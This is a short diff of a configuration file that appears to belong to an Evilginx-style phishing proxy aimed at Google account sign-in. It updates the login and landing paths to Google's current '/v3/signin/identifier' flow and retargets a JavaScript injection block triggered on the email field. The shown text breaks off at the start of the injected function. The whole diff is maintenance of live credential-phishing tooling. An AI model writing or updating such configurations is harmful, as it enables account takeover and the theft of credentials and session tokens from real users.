@@ -44,14 +44,14 @@ auth_urls:
   - '/_/AccountSettingsUi/browserinfo'
 
 landing_path:
-  - '/signin/v3/identifier'
+  - '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 login:
     domain: 'accounts.google.com'
-    path: '/ServiceLogin'
-    #path: '/signin/v2/identifier'
+    #path: '/ServiceLogin'
+    path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 js_inject:  
   - trigger_domains: ["accounts.google.com"]
-    trigger_paths: ["/signin/v3/identifier"]
+    trigger_paths: ["/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin"]
     trigger_params: ["email"]
     script: |
       function lp(){
